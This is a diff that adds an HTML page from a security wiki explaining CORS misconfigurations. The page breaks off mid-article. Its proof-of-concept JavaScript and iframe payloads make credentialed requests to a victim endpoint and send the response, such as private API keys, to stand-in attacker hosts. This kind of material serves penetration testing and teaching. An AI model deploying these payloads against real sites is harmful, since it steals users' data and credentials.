@@ -1,0 +1,1077 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="All about cors misconfigurations.">
+<meta name="theme-color" content="#FFFFFF">
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="CORS Misconfigurations" />
+<meta property="og:description" content="All about cors misconfigurations." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/cors_misconfigurations/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-16T00:00:00+00:00" />
+<title>CORS Misconfigurations | Gray Hat Freelancing</title>
+<link rel="manifest" href="/manifest.json">
+<link rel="icon" href="/favicon.png" type="image/x-icon">
+<link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
+  <script defer src="/flexsearch.min.js"></script>
+  <script defer src="/en.search.min.d50fea2a76ff11c274e36eee7c462453fa589bda1ed7236d45eaf1c9b25c1336.js" integrity="sha256-1Q/qKnb/EcJ0427ufEYkU/pYm9oe1yNtRerxybJcEzY=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-124168691-2', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script><!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+  
+</head>
+<body dir="ltr">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    <aside class="book-menu">
+      <div class="book-menu-content">
+        
+  <nav>
+<h2 class="book-brand">
+  <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Gray Hat Freelancing</span>
+  </a>
+</h2>
+
+
+<div class="book-search">
+  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+
+
+
+  
+
+
+
+  
+    
+  
+    
+  
+
+
+
+<ul class="book-languages">
+  <li>
+    <input type="checkbox" id="languages" class="toggle" />
+    <label for="languages" class="flex justify-between">
+      <a role="button" class="flex align-center">
+        <img src="/svg/translate.svg" class="book-icon" alt="Languages" />
+        English
+      </a>
+    </label>
+
+    <ul>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/ru/">
+          Russian
+        </a>
+      </li>
+      
+      <li>
+        <a href="https://www.grayhatfreelancing.com/zh/">
+          Chinese
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+</ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <ul>
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <a href="/docs/example/" class="">Example Site</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/" class="">Table of Contents</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/with-toc/" class="">With ToC</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/table-of-contents/without-toc/" class="">Without ToC</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-4e46b01272d410b3a99461d79326ddf4" class="toggle"  />
+    <label for="section-4e46b01272d410b3a99461d79326ddf4" class="flex justify-between">
+      <a role="button" class="">Collapsed</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/" class="">3rd Level</a>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/example/collapsed/3rd-level/4th-level/" class="">4th Level</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/attacking_active_directory/" class="">Active Directory Attacks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/bind_shell_cheatsheet/" class="">Bind Shell Cheatsheet</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cobalt_strike_all_you_need/" class="">Cobalt Strike</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/microsoft_azure_cloud/" class="">Microsoft&#39;s Azure Cloud</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/docker_pentesting/" class="">Docker Security</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csv_injection/" class="">Csv Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/checking_for_account_takeover/" class="">Account Takeovers</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/amazon_aws_s3_buckets/" class="">Amazon AWS S3 Buckets</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/api_key_leaks/" class="">API Key Leaks</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/command_injection/" class="">Command Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cors_misconfigurations/" class="active">CORS Misconfigurations</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/crlf_injection/" class="">CRLF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/csrf_injection/" class="">CSRF Injection</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/cve_exploits/" class="">CVE Exploits</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/dependency_confusion_attacks/" class="">Dependency Confusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/file_inclusion/" class="">File Inclusion</a>
+  
+
+        </li>
+      
+    
+      
+        <li class="book-section-flat" >
+          
+  
+  
+
+  
+    <span>Shortcodes</span>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/buttons/" class="">Buttons</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/columns/" class="">Columns</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/details/" class="">Details</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/expand/" class="">Expand</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/hints/" class="">Hints</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/katex/" class="">Katex</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/mermaid/" class="">Mermaid</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <input type="checkbox" id="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="toggle"  />
+    <label for="section-d3fc1bf6d66cd84b896a0af9f40cb1d5" class="flex justify-between">
+      <a href="/docs/shortcodes/section/" class="">Section</a>
+    </label>
+  
+
+          
+  <ul>
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/first-page/" class="">First Page</a>
+  
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/section/second-page/" class="">Second Page</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/shortcodes/tabs/" class="">Tabs</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+        </li>
+      
+    
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/directory_traversal/" class="">Directory Traversal</a>
+  
+
+        </li>
+      
+    
+  </ul>
+
+
+
+
+
+
+
+
+
+
+
+  
+<ul>
+  
+  <li>
+    <a href="/posts/"  >
+        Blog
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/"  target="_blank" rel="noopener">
+        Github
+      </a>
+  </li>
+  
+  <li>
+    <a href="https://github.com/m00tiny/grayhatfreelancing"  target="_blank" rel="noopener">
+        Contribute
+      </a>
+  </li>
+  
+</ul>
+
+
+
+
+
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+ 
+      </div>
+    </aside>
+
+    <div class="book-page">
+      <header class="book-header">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <strong>CORS Misconfigurations</strong>
+
+  <label for="toc-control">
+    
+    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden clearfix">
+    
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#cors-misconfiguration">CORS Misconfiguration</a>
+      <ul>
+        <li><a href="#tools">Tools</a></li>
+        <li><a href="#prerequisites">Prerequisites</a></li>
+        <li><a href="#exploitation">Exploitation</a>
+          <ul>
+            <li><a href="#vulnerable-example-origin-reflection">Vulnerable Example: Origin Reflection</a></li>
+            <li><a href="#vulnerable-example-null-origin">Vulnerable Example: Null Origin</a></li>
+            <li><a href="#vulnerable-example-xss-on-trusted-origin">Vulnerable Example: XSS on Trusted Origin</a></li>
+            <li><a href="#vulnerable-example-wildcard-origin--without-credentials">Vulnerable Example: Wildcard Origin <code>*</code> without Credentials</a></li>
+            <li><a href="#vulnerable-example-expanding-the-origin--regex-issues">Vulnerable Example: Expanding the Origin / Regex Issues</a></li>
+          </ul>
+        </li>
+        <li><a href="#bug-bounty-reports">Bug Bounty reports</a></li>
+        <li><a href="#references">References</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      
+      
+  <article class="markdown"><h1 id="cors-misconfiguration">
+  CORS Misconfiguration
+  <a class="anchor" href="#cors-misconfiguration">#</a>
+</h1>
+<blockquote>
+<p>A site-wide CORS misconfiguration was in place for an API domain. This allowed an attacker to make cross origin requests on behalf of the user as the application did not whitelist the Origin header and had Access-Control-Allow-Credentials: true meaning we could make requests from our attacker’s site using the victim’s credentials.</p>
+</blockquote>
+<h2 id="tools">
+  Tools
+  <a class="anchor" href="#tools">#</a>
+</h2>
+<ul>
+<li>
+  <a href="https://github.com/s0md3v/Corsy/">Corsy - CORS Misconfiguration Scanner</a></li>
+<li>
+  <a href="https://tools.honoki.net/postmessage.html">PostMessage POC Builder - @honoki</a></li>
+</ul>
+<h2 id="prerequisites">
+  Prerequisites
+  <a class="anchor" href="#prerequisites">#</a>
+</h2>
+<ul>
+<li>BURP HEADER&gt; <code>Origin: https://evil.com</code></li>
+<li>VICTIM HEADER&gt; <code>Access-Control-Allow-Credential: true</code></li>
+<li>VICTIM HEADER&gt; <code>Access-Control-Allow-Origin: https://evil.com</code> OR <code>Access-Control-Allow-Origin: null</code></li>
+</ul>
+<h2 id="exploitation">
+  Exploitation
+  <a class="anchor" href="#exploitation">#</a>
+</h2>
+<p>Usually you want to target an API endpoint. Use the following payload to exploit a CORS misconfiguration on target <code>https://victim.example.com/endpoint</code>.</p>
+<h3 id="vulnerable-example-origin-reflection">
+  Vulnerable Example: Origin Reflection
+  <a class="anchor" href="#vulnerable-example-origin-reflection">#</a>
+</h3>
+<h4 id="vulnerable-implementation">
+  Vulnerable Implementation
+  <a class="anchor" href="#vulnerable-implementation">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>GET /endpoint HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#960050;background-color:#1e0010">:</span> victim.example.com
+</span></span><span style="display:flex;"><span>Origin<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//evil.com
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#960050;background-color:#1e0010">:</span> sessionid=... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/<span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin: https<span style="color:#960050;background-color:#1e0010">:</span>//evil.com
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Credentials: true 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;[private API key]&#34;</span>}
+</span></span></code></pre></div><h4 id="proof-of-concept">
+  Proof of concept
+  <a class="anchor" href="#proof-of-concept">#</a>
+</h4>
+<p>This PoC requires that the respective JS script is hosted at <code>evil.com</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://victim.example.com/endpoint&#39;</span>,<span style="color:#66d9ef">true</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//atttacker.net/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>; 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>or</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>     &lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">h2</span>&gt;CORS PoC&lt;/<span style="color:#f92672">h2</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;demo&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>             &lt;<span style="color:#f92672">button</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;button&#34;</span> <span style="color:#a6e22e">onclick</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cors()&#34;</span>&gt;Exploit&lt;/<span style="color:#f92672">button</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;/<span style="color:#f92672">div</span>&gt;
+</span></span><span style="display:flex;"><span>         &lt;<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">cors</span>() {
+</span></span><span style="display:flex;"><span>             <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xhr</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>();
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">onreadystatechange</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span>() {
+</span></span><span style="display:flex;"><span>                 <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">readyState</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">status</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">200</span>) {
+</span></span><span style="display:flex;"><span>                 document.<span style="color:#a6e22e">getElementById</span>(<span style="color:#e6db74">&#34;demo&#34;</span>).<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">alert</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>);
+</span></span><span style="display:flex;"><span>                 }
+</span></span><span style="display:flex;"><span>             };
+</span></span><span style="display:flex;"><span>              <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;GET&#34;</span>,
+</span></span><span style="display:flex;"><span>                       <span style="color:#e6db74">&#34;https://victim.example.com/endpoint&#34;</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">xhr</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>             }
+</span></span><span style="display:flex;"><span>         &lt;/<span style="color:#f92672">script</span>&gt;
+</span></span><span style="display:flex;"><span>     &lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span> &lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><h3 id="vulnerable-example-null-origin">
+  Vulnerable Example: Null Origin
+  <a class="anchor" href="#vulnerable-example-null-origin">#</a>
+</h3>
+<h4 id="vulnerable-implementation-1">
+  Vulnerable Implementation
+  <a class="anchor" href="#vulnerable-implementation-1">#</a>
+</h4>
+<p>It&rsquo;s possible that the server does not reflect the complete <code>Origin</code> header but
+that the <code>null</code> origin is allowed. This would look like this in the server&rsquo;s
+response:</p>
+<pre tabindex="0"><code>GET /endpoint HTTP/1.1
+Host: victim.example.com
+Origin: null
+Cookie: sessionid=... 
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: null
+Access-Control-Allow-Credentials: true 
+
+{&#34;[private API key]&#34;}
+</code></pre><h4 id="proof-of-concept-1">
+  Proof of concept
+  <a class="anchor" href="#proof-of-concept-1">#</a>
+</h4>
+<p>This can be exploited by putting the attack code into an iframe using the data
+URI scheme. If the data URI scheme is used, the browser will use the <code>null</code>
+origin in the request:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">iframe</span> <span style="color:#a6e22e">sandbox</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;allow-scripts allow-top-navigation allow-forms&#34;</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:text/html, &lt;script&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  var req = new XMLHttpRequest();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.onload = reqListener;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.open(&#39;get&#39;,&#39;https://victim.example.com/endpoint&#39;,true);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.withCredentials = true;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  req.send();
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  function reqListener() {
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    location=&#39;https://attacker.example.net/log?key=&#39;+encodeURIComponent(this.responseText);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">   };
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&lt;/script&gt;&#34;</span>&gt;&lt;/<span style="color:#f92672">iframe</span>&gt; 
+</span></span></code></pre></div><h3 id="vulnerable-example-xss-on-trusted-origin">
+  Vulnerable Example: XSS on Trusted Origin
+  <a class="anchor" href="#vulnerable-example-xss-on-trusted-origin">#</a>
+</h3>
+<p>If the application does implement a strict whitelist of allowed origins, the
+exploit codes from above do not work. But if you have an XSS on a trusted
+origin, you can inject the exploit coded from above in order to exploit CORS
+again.</p>
+<pre tabindex="0"><code>https://trusted-origin.example.com/?xss=&lt;script&gt;CORS-ATTACK-PAYLOAD&lt;/script&gt;
+</code></pre><h3 id="vulnerable-example-wildcard-origin--without-credentials">
+  Vulnerable Example: Wildcard Origin <code>*</code> without Credentials
+  <a class="anchor" href="#vulnerable-example-wildcard-origin--without-credentials">#</a>
+</h3>
+<p>If the server responds with a wildcard origin <code>*</code>, <strong>the browser does never send
+the cookies</strong>. However, if the server does not require authentication, it&rsquo;s still
+possible to access the data on the server. This can happen on internal servers
+that are not accessible from the Internet. The attacker&rsquo;s website can then
+pivot into the internal network and access the server&rsquo;s data without authentication.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>* is the only wildcard origin
+</span></span><span style="display:flex;"><span>https<span style="color:#960050;background-color:#1e0010">:</span>//*.example.com is not valid
+</span></span></code></pre></div><h4 id="vulnerable-implementation-2">
+  Vulnerable Implementation
+  <a class="anchor" href="#vulnerable-implementation-2">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>GET /endpoint HTTP/<span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#960050;background-color:#1e0010">:</span> api.internal.example.com
+</span></span><span style="display:flex;"><span>Origin<span style="color:#960050;background-color:#1e0010">:</span> https<span style="color:#960050;background-color:#1e0010">:</span>//evil.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HTTP/<span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> OK
+</span></span><span style="display:flex;"><span>Access-Control-Allow-Origin: *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e6db74">&#34;[private API key]&#34;</span>}
+</span></span></code></pre></div><h4 id="proof-of-concept-2">
+  Proof of concept
+  <a class="anchor" href="#proof-of-concept-2">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://api.internal.example.com/endpoint&#39;</span>,<span style="color:#66d9ef">true</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//atttacker.net/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>; 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h3 id="vulnerable-example-expanding-the-origin--regex-issues">
+  Vulnerable Example: Expanding the Origin / Regex Issues
+  <a class="anchor" href="#vulnerable-example-expanding-the-origin--regex-issues">#</a>
+</h3>
+<p>Occasionally, certain expansions of the original origin are not filtered on the server side. This might be caused by using a badly implemented regular expressions to validate the origin header.</p>
+<h4 id="vulnerable-implementation-example-1">
+  Vulnerable Implementation (Example 1)
+  <a class="anchor" href="#vulnerable-implementation-example-1">#</a>
+</h4>
+<p>In this scenario any prefix inserted in front of <code>example.com</code> will be accepted by the server.</p>
+<pre tabindex="0"><code>GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://evilexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://evilexample.com
+Access-Control-Allow-Credentials: true 
+
+{&#34;[private API key]&#34;}
+</code></pre><h4 id="proof-of-concept-example-1">
+  Proof of concept (Example 1)
+  <a class="anchor" href="#proof-of-concept-example-1">#</a>
+</h4>
+<p>This PoC requires the respective JS script to be hosted at <code>evilexample.com</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XMLHttpRequest</span>(); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">onload</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">reqListener</span>; 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;get&#39;</span>,<span style="color:#e6db74">&#39;https://api.example.com/endpoint&#39;</span>,<span style="color:#66d9ef">true</span>); 
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">withCredentials</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">send</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">reqListener</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;//atttacker.net/log?key=&#39;</span><span style="color:#f92672">+</span><span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">responseText</span>; 
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><h4 id="vulnerable-implementation-example-2">
+  Vulnerable Implementation (Example 2)
+  <a class="anchor" href="#vulnerable-implementation-example-2">#</a>
+</h4>
+<p>In this scenario the server utilizes a regex where the dot was not escaped correctly. For instance, something like this: <code>^api.example.com$</code> instead of <code>^api\.example.com$</code>. Thus, the dot can be replaced with any letter to gain access from a third-party domain.</p>
+<pre tabindex="0"><code>GET /endpoint HTTP/1.1
+Host: api.example.com
+Origin: https://apiiexample.com
+
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://apiiexample.com
+Access-Control-Allow-Credentials: true 
+
+{&#34;[private API key]&#34;}
+</code></pre><h4 id="proof-of-concept-example-2">
+  Proof of concept (Example 2)
+  <a class="anchor" href="#proof-of-concept-example-2">#</a>
+</h4>
+<p>This PoC requires the respective JS script to be hosted at <code>apiiexample.com</code></p>
